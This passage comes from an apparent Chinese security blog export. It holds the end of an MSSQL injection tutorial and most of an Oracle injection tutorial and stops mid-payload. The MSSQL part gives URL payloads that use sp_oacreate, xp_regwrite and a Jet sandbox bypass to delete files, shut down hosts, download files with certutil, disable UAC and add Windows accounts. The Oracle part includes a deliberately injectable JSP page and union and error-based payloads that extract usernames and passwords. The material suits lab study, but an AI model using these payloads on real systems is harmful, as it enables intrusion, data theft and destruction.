<h4 id="开启扩展-1"><a href="#开启扩展-1" class="headerlink" title="开启扩展"></a>开启扩展</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;ole automation procedures&#x27;,1;reconfigure;</span><br></pre></td></tr></table></figure>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制文件</span><br><span class="line">http://hackrock.com:8205/?id=1;declare @o int;exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out;exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;c:\1.txt&#x27;,&#x27;c:\2.txt&#x27;</span><br><span class="line"></span><br><span class="line">移动文件</span><br><span class="line">http://hackrock.com:8205/?id=1;declare @o int;exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out;exec sp_oamethod @o, &#x27;movefile&#x27;,null,&#x27;c:\1.txt&#x27;,&#x27;c:\temp\2.txt&#x27;</span><br><span class="line"></span><br><span class="line">删除文件</span><br><span class="line">http://hackrock.com:8205/?id=1;declare @o int;exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out;exec sp_oamethod @o, &#x27;deletefile&#x27;,null,&#x27;c:\1.txt&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="调用wcsript-shell执行命令"><a href="#调用wcsript-shell执行命令" class="headerlink" title="调用wcsript.shell执行命令"></a>调用wcsript.shell执行命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">远程关机</span><br><span class="line">http://hackrock.com:8205/?id=1;declare @shell int;exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output;exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;shutdown -p&#x27;</span><br><span class="line"></span><br><span class="line">远程下载文件</span><br><span class="line">http://hackrock.com:8205/?id=1;declare @shell int;exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output;exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;certutil -urlcache -split -f http://192.168.123.42/1.txt c:\1.txt&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="xp-regwrite"><a href="#xp-regwrite" class="headerlink" title="xp_regwrite"></a>xp_regwrite</h3><p>在sa权限下可以调用xp_rewrite写入注册表。</p>
<h4 id="注册表写入"><a href="#注册表写入" class="headerlink" title="注册表写入"></a>注册表写入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将命令写入注册表启动项</span><br><span class="line">http://hackrock.com:8205/?id=1;exec xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#x27;,&#x27;black&#x27;,&#x27;REG_SZ&#x27;,&#x27;net user test test /add&#x27;</span><br><span class="line"></span><br><span class="line">关闭UAC</span><br><span class="line">http://hackrock.com:8205/?id=1;exec xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&#x27;,&#x27;EnableLUA&#x27;,&#x27;REG_DWORD&#x27;,0</span><br></pre></td></tr></table></figure>
<h4 id="启用沙盒模式进行命令执行"><a href="#启用沙盒模式进行命令执行" class="headerlink" title="启用沙盒模式进行命令执行"></a>启用沙盒模式进行命令执行</h4><ul>
<li>当执行命令方法无法使用时，可以使用沙盒进行提权。沙盒模式（SandBoxMode）是一种安全功能。在沙盒模式下，Access 只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。例如，诸如Kill和Shell之类的函数可能被用来损坏计算机上的数据和文件，因此它们被视为不安全的。当Access以沙盒模式运行时，调用这些函数的表达式将会产生错误消息。</li>
<li>OLE DB：OLE DB Driver for SQL Server 是用于访问数据的底层 COM API，是应用程序链接到SQL Server的的驱动程序。</li>
<li>其核心其实是修改注册表，默认情况下，注册表中mdb数据库不允许执行系统命令，但是开启沙盒模式，就准许mdb文件执行数据库，通过查询方式调用mdb文件，执行参数，绕过系统本身自己的执行命令，实现mdb文件执行命令。</li>
</ul>
<p><strong>注册表关闭沙盒模式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;exec xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0</span><br></pre></td></tr></table></figure>
<p><strong>开启外围组件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br></pre></td></tr></table></figure>
<p><strong>执行命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;,&#x27;select shell(&quot;cmd.exe /c net user estelle 123456 /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
<p>注：该方法在32位系统下会出错</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://baike.baidu.com/item/SQLSERVER数据库/8979184">SQLserver数据库_百度百科 (baidu.com)</a></li>
<li><a href="https://www.w3cschool.cn/t_sql/">T-SQL 教程_w3cschool</a></li>
<li><a href="https://www.cnblogs.com/c123321/p/5528315.html">﻿﻿﻿﻿SQL Server中默认数据库和默认表的作用 - 张荣建 - 博客园 (cnblogs.com)</a></li>
<li>《Web入侵先遣—SQL注入攻击技术初探 》</li>
<li><a href="https://blog.csdn.net/weixin_45634365/article/details/114361769">MSSQL-反弹注入_弈-剑的博客-CSDN博客_mssql反弹注入</a></li>
<li><a href="https://blog.csdn.net/u014029795/article/details/116910134">SQL Server提权总结与记录-xp_cmdshell/sp_oacreate/sandbox提权_baynk的博客-CSDN博客_sp_oacreate提权</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle数据库注入攻击方式</title>
    <url>/post/ec74cb90.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Oracle数据库的基本知识"><a href="#Oracle数据库的基本知识" class="headerlink" title="Oracle数据库的基本知识"></a>Oracle数据库的基本知识</h2><h3 id="Oracle数据库介绍"><a href="#Oracle数据库介绍" class="headerlink" title="Oracle数据库介绍"></a>Oracle数据库介绍</h3><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。</p>
<p>Oracle对于MYSQL、MSSQL来说意味着更大的数据量，更大的权限。</p>
<p>Oracle服务默认端口：1521</p>
<h3 id="Oracle权限分类"><a href="#Oracle权限分类" class="headerlink" title="Oracle权限分类"></a>Oracle权限分类</h3><p>权限是用户对一项功能的执行权力。在Oracle中，根据系统管理方式不同，将Oracle权限分为系统权限与实体权限两类。系统权限是指是否被授权用户可以连接到数据库上，在数据库中可以进行哪些系统操作。而实体权限是指用户对具体的模式实体(schema)所拥有的权限。</p>
<p>系统权限：系统规定用户使用数据库的权限。（系统权限是对用户而言)。</p>
<p>实体权限：某种权限用户对其它用户的表或视图的存取权限。（是针对表或视图而言的）。</p>
<h4 id="系统权限管理"><a href="#系统权限管理" class="headerlink" title="系统权限管理"></a>系统权限管理</h4><p>—— 系统权限分类 ——</p>
<ul>
<li>DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。</li>
<li>RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。</li>
<li>CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构。</li>
</ul>
<p>对于普通用户：授予connect, resource权限。</p>
<p>对于DBA管理用户：授予connect，resource, dba权限。</p>
<blockquote>
<p>系统权限授权命令： 系统权限只能由DBA用户授出：sys, system(最开始只能是这两个用户) 授权命令：SQL&gt; grant connect, resource, dba to 用户名1 [,用户名2]…; 注:普通用户通过授权可以具有与system相同的用户权限，但永远不能达到与sys用户相同的权限，system用户的权限也可以被回收。 例： SQL&gt; connect system/manager SQL&gt; Create user user50 identified by user50; SQL&gt; grant connect, resource to user50;</p>
<p>查询用户拥有哪里权限： SQL&gt; select <em> from dba_role_privs; SQL&gt; select </em> from dba_sys_privs; SQL&gt; select * from role_sys_privs;</p>
<p>查自己拥有哪些系统权限 SQL&gt; select * from session_privs;</p>
<p>删除用户 SQL&gt; drop user 用户名 cascade; //加上cascade则将用户连同其创建的东西全部删除</p>
<p>系统权限传递：增加WITH ADMIN OPTION选项，则得到的权限可以传递。 SQL&gt; grant connect, resorce to user50 with admin option; //可以传递所获权限。</p>
<p>系统权限回收：系统权限只能由DBA用户回收 SQL&gt; Revoke connect, resource from user50;</p>
<p>说明： 1）如果使用WITH ADMIN OPTION为某个用户授予系统权限，那么对于被这个用户授予相同权限的所有用户来说，取消该用户的系统权限并不会级联取消这些用户的相同权限。 2）系统权限无级联，即A授予B权限，B授予C权限，如果A收回B的权限，C的权限不受影响；系统权限可以跨用户回收，即A可以直接收回C用户的权限。</p>
</blockquote>
<h4 id="实体权限管理"><a href="#实体权限管理" class="headerlink" title="实体权限管理"></a>实体权限管理</h4><p>—— 实体权限分类 ——</p>
<ul>
<li>select, update, insert, alter, index, delete, all //all包括所有权限</li>
<li>execute //执行存储过程权限</li>
</ul>
<blockquote>
<p>user01: SQL&gt; grant select, update, insert on product to user02; SQL&gt; grant all on product to user02;</p>
<p>user02: SQL&gt; select * from user01.product; // 此时user02查user_tables，不包括user01.product这个表，但如果查all_tables则可以查到，因为他可以访问。</p>
<p>将表的操作权限授予全体用户： SQL&gt; grant all on product to public; // public表示是所有的用户，这里的all权限不包括drop。</p>
<p>实体权限数据字典 SQL&gt; select owner, table_name from all_tables; // 用户可以查询的表 SQL&gt; select table_name from user_tables; // 用户创建的表 SQL&gt; select grantor, table_schema, table_name, privilege from all_tab_privs; // 获权可以存取的表（被授权的） SQL&gt; select grantee, owner, table_name, privilege from user_tab_privs; // 授出权限的表(授出的权限)</p>
<p>DBA用户可以操作全体用户的任意基表(无需授权，包括删除)：</p>
<p>DBA用户： SQL&gt; Create table stud02.product( id number(10), name varchar2(20)); SQL&gt; drop table stud02.emp;</p>
<p>SQL&gt; create table stud02.employee as select * from scott.emp;</p>
<p>实体权限传递(with grant option)：</p>
<p>user01: SQL&gt; grant select, update on product to user02 with grant option; // user02得到权限，并可以传递。</p>
<p>实体权限回收：</p>
<p>user01: SQL&gt;Revoke select, update on product from user02; //传递的权限将全部丢失。</p>
<p>说明 1）如果取消某个用户的对象权限，那么对于这个用户使用WITH GRANT OPTION授予权限的用户来说，同样还会取消这些用户的相同权限，也就是说取消授权时级联的。</p>
</blockquote>
<h4 id="管理角色"><a href="#管理角色" class="headerlink" title="管理角色"></a>管理角色</h4><blockquote>
<p>建一个角色 sql&gt;create role role1;</p>
<p>授权给角色 sql&gt;grant create any table,create procedure to role1;</p>
<p>授予角色给用户 sql&gt;grant role1 to user1;</p>
<p>查看角色所包含的权限 sql&gt;select * from role_sys_privs;</p>
<p>创建带有口令以角色(在生效带有口令的角色时必须提供口令) sql&gt;create role role1 identified by password1;</p>
<p>修改角色：是否需要口令 sql&gt;alter role role1 not identified; sql&gt;alter role role1 identified by password1;</p>
<p>设置当前用户要生效的角色 (注：角色的生效是一个什么概念呢？假设用户a有b1,b2,b3三个角色，那么如果b1未生效，则b1所包含的权限对于a来讲是不拥有的，只有角色生效了，角色内的权限才作用于用户，最大可生效角色数由参数MAX_ENABLED_ROLES设定；在用户登录后，oracle将所有直接赋给用户的权限和用户默认角色中的权限赋给用户。） sql&gt;set role role1; //使role1生效 sql&gt;set role role,role2; //使role1,role2生效 sql&gt;set role role1 identified by password1; //使用带有口令的role1生效 sql&gt;set role all; //使用该用户的所有角色生效 sql&gt;set role none; //设置所有角色失效 sql&gt;set role all except role1; //除role1外的该用户的所有其它角色生效。 sql&gt;select * from SESSION_ROLES; //查看当前用户的生效的角色。</p>
<p>修改指定用户，设置其默认角色 sql&gt;alter user user1 default role role1; sql&gt;alter user user1 default role all except role1;</p>
<p>删除角色 sql&gt;drop role role1;</p>
<p>角色删除后，原来拥用该角色的用户就不再拥有该角色了，相应的权限也就没有了。</p>
<p>说明: 1)无法使用WITH GRANT OPTION为角色授予对象权限 2)可以使用WITH ADMIN OPTION 为角色授予系统权限,取消时不是级联</p>
</blockquote>
<h3 id="PL-SQL语言"><a href="#PL-SQL语言" class="headerlink" title="PL/SQL语言"></a>PL/SQL语言</h3><p>PL/SQL也是一种程序语言，叫做过程化SQL语言（Procedual Language/SQL）。</p>
<p>PL/SQL是Oracle数据库对SQL语句的扩展。在普通SQL语句的使用上增加了编程语言的特点，所以PL/SQL就是把数据操作和查询语句组织在PL/SQL代码的过程性单元中，通过逻辑判断、循环等操作实现复杂的功能或者计算的程序语言。 在PL/SQL编程语言是由甲骨文公司在20世纪80年代，作为SQL程序扩展语言和Oracle关系数据库开发。</p>
<p>基本存储过程结构：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">    &lt;declarations section&gt;</span><br><span class="line">BEGIN</span><br><span class="line">    &lt;executable command(s)&gt;</span><br><span class="line">EXCEPTION</span><br><span class="line">    &lt;exception handing&gt;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="SQL注入需注意的规则"><a href="#SQL注入需注意的规则" class="headerlink" title="SQL注入需注意的规则"></a>SQL注入需注意的规则</h3><ol>
<li>Oracle使用查询语言获取需要跟上表名，这一点和Access类似，没有表的情况下可以使用dual表，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录。</li>
<li>Oracle的数据库类型是强匹配，所以在Oracle进行类似Union查询数据时必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用NULL代替某些无法快速猜测出的数据类型位置，这一点和SQLServer类似。</li>
<li>Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页 例如: <code>SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;=0</code></li>
<li>Oracle的单行注释符号是<code>--</code>，多行注释符号<code>/**/</code>。</li>
<li>Oracle 数据库包含了几个系统表，这几个系统表里存储了系统数据库的表名和列名，如user_tab_columns，all_tab_columns，all_tables，user_tables 系统表就存储了用户的所有的表、列名，其中table_name 表示的是系统里的表名，column_name 里的是系统里存在的列名。</li>
<li>Oracle使用<code>||</code>拼接字符串（在URL中使用编码<code>%7c</code>表示），<code>concat()</code>函数也可以实现两个字符串的拼接</li>
</ol>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li>操作系统：Windows Server 2008R2</li>
<li>数据库：Microsoft SQL Server 2008R2</li>
<li>Web服务器：Tomcat 7.0</li>
<li>脚本语言：jsp</li>
<li>源代码：index.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span>  pageEncoding=<span class="string">&quot;utf-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;oracle.jdbc.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.sql.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;oracle.sql.*&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">String path = request.getContextPath();</span><br><span class="line">String basePath = request.getScheme()+<span class="string">&quot;://&quot;</span>+request.getServerName()+<span class="string">&quot;:&quot;</span>+request.getServerPort()+path+<span class="string">&quot;/&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;base href=<span class="string">&quot;&lt;%=basePath%&gt;&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;title&gt;Oracle注入测试&lt;/title&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;pragma&quot;</span> content=<span class="string">&quot;no-cache&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;cache-control&quot;</span> content=<span class="string">&quot;no-cache&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;expires&quot;</span> content=<span class="string">&quot;0&quot;</span>&gt;    </span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;keyword1,keyword2,keyword3&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;This is my page&quot;</span>&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">        &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;styles.css&quot;</span> mce_href=<span class="string">&quot;styles.css&quot;</span>&gt;</span><br><span class="line">        --&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;body&gt; </span><br><span class="line">    &lt;%</span><br><span class="line">        String  url  =  <span class="string">&quot;http://&quot;</span>  +  request.getServerName()  +  <span class="string">&quot;:&quot;</span>  +  request.getServerPort()  +  request.getContextPath()+request.getServletPath();</span><br><span class="line">            Class.forName(<span class="string">&quot;oracle.jdbc.driver.OracleDriver&quot;</span>).newInstance();</span><br><span class="line">            Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">            ResultSet rs=<span class="keyword">null</span>;</span><br><span class="line">            String oraUrl=<span class="string">&quot;jdbc:oracle:thin:@127.0.0.1:1521:orcl&quot;</span>;</span><br><span class="line">            String oraUser=<span class="string">&quot;TEST&quot;</span>;</span><br><span class="line">            String oraPWD=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                    DriverManager.registerDriver(<span class="keyword">new</span> oracle.jdbc.driver.OracleDriver());</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)</span><br><span class="line">            &#123;</span><br><span class="line">                out.print(<span class="string">&quot;filed!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                Connection conn=DriverManager.getConnection(oraUrl,oraUser,oraPWD);</span><br><span class="line">                String sql=<span class="string">&quot;select * from news where id=&quot;</span>+request.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;执行语句:&lt;br&gt;&quot;</span>+sql+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">                stmt = conn.createStatement();</span><br><span class="line">                rs = stmt.executeQuery(sql);</span><br><span class="line">                out.print(<span class="string">&quot;结果为:&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;table border=&#x27;1&#x27; cellpadding=&#x27;4&#x27; cellspacing=&#x27;0&#x27; style=&#x27;background-color:White;border-color:#3366CC;border-width:1px;border-style:None;width:203px;border-collapse:collapse;&#x27;&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;tr style=&#x27;color:#CCCCFF;background-color:#003399;font-weight:bold;&#x27;&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;td&gt;id&lt;/td&gt;&lt;td&gt;title&lt;/td&gt;&lt;td&gt;content&lt;/td&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;tr style=&#x27;color:#003399;background-color:White;&#x27;&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">while</span>(rs.next())</span><br><span class="line">                &#123;</span><br><span class="line">                        out.print(<span class="string">&quot;&lt;td&gt;&quot;</span>);out.print(rs.getString(<span class="number">1</span>));out.print(<span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                        out.print(<span class="string">&quot;&lt;td&gt;&quot;</span>);out.print(rs.getString(<span class="number">2</span>));out.print(<span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                        out.print(<span class="string">&quot;&lt;td&gt;&quot;</span>);out.print(rs.getString(<span class="number">3</span>));out.print(<span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                out.print(<span class="string">&quot;&lt;tr&gt;&quot;</span>);</span><br><span class="line">                rs.close();</span><br><span class="line">                stmt.close();</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e)</span><br><span class="line">            &#123;</span><br><span class="line">                    System.out.println(e.toString());</span><br><span class="line">                    out.print(e.toString());</span><br><span class="line">            &#125;</span><br><span class="line">     %&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>判断注入点的方式与之前的数据库注入一样，就不详细讲了。</p>
<h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><p>依旧提交order by 去猜测显示当前页面所用的SQL查询了多少个字段，也就是确认查询字段数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 order by 3 --+</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 order by 4 --+</span><br></pre></td></tr></table></figure>
<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select null,null,null from dual --+</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,&#x27;2&#x27;,&#x27;3&#x27; from dual --+</span><br></pre></td></tr></table></figure>
<h3 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取数据库版本</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select banner from sys.v_$version where rownum=1 ),&#x27;3&#x27; from dual --+		</span><br><span class="line"></span><br><span class="line">获取数据库的实例名(SYS用户才可查询)</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select instance_name from v_$instance),&#x27;3&#x27; from dual --+	</span><br></pre></td></tr></table></figure>
<h3 id="获取用户名"><a href="#获取用户名" class="headerlink" title="获取用户名"></a>获取用户名</h3><p>Oracle没有数据库名的概念，所谓数据库名，即数据表的拥有者，也就是用户名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取第一个用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select username from all_users where rownum=1),&#x27;3&#x27; from dual --+	</span><br><span class="line"></span><br><span class="line">获取第二个用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select username from all_users where rownum=1 and username&lt;&gt;&#x27;SYS&#x27;),&#x27;3&#x27; from dual --+	</span><br><span class="line"></span><br><span class="line">获取当前用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(SELECT user FROM dual),&#x27;3&#x27; from dual --+</span><br></pre></td></tr></table></figure>
<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取TEST用户的第一张表</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),&#x27;3&#x27; from dual --+</span><br><span class="line"></span><br><span class="line">获取TEST用户的第二张表</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27; and table_name&lt;&gt;&#x27;NEWS&#x27;),&#x27;3&#x27; from dual --+</span><br></pre></td></tr></table></figure>
<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取TEST用户的USERS表的第一个列名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1),&#x27;3&#x27; from dual --+	</span><br><span class="line"></span><br><span class="line">获取TEST用户的USERS表的第二个列名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1 and column_name&lt;&gt;&#x27;ID&#x27;),&#x27;3&#x27; from dual --+	</span><br></pre></td></tr></table></figure>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select concat(concat(username,&#x27;~~&#x27;),password) from users where rownum=1),null from dual --+	</span><br></pre></td></tr></table></figure>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在oracle注入时候出现了数据库报错信息，可以优先选择报错注入，使用报错的方式将查询数据的结果带出到错误页面中。</p>
<p>使用报错注入需要使用类似 1=[报错语句]，1&gt;[报错语句]，使用比较运算符，这样的方式进行报错注入（MYSQL仅使用函数报错即可），类似mssql报错注入的方式。</p>
<h3 id="utl-inaddr-get-host-name-函数报错注入"><a href="#utl-inaddr-get-host-name-函数报错注入" class="headerlink" title="utl_inaddr.get_host_name()函数报错注入"></a>utl_inaddr.get_host_name()函数报错注入</h3><p><code>utl_inaddr.get_host_address</code> 本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。</p>
<p>我们传递的是一个sql 语句所以返回的就是语句执行的结果。oracle 在启动之后，把一些系统变量都放置到一些特定的视图当中，可以利用这些视图获得想要的东西。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br></pre></td></tr></table></figure>
<h3 id="ctxsys-drithsx-sn-函数报错注入"><a href="#ctxsys-drithsx-sn-函数报错注入" class="headerlink" title="ctxsys.drithsx.sn()函数报错注入"></a>ctxsys.drithsx.sn()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 